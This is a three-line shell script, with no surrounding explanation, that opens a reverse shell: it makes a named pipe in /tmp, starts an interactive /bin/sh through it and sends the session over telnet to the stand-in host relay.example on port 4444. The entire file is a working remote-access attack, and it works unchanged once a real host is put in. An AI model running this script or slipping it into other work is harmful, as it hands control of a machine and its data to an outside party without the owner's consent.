#!/bin/sh
mkfifo /tmp/session-pipe
/bin/sh -i < /tmp/session-pipe 2>&1 | telnet relay.example 4444 > /tmp/session-pipe
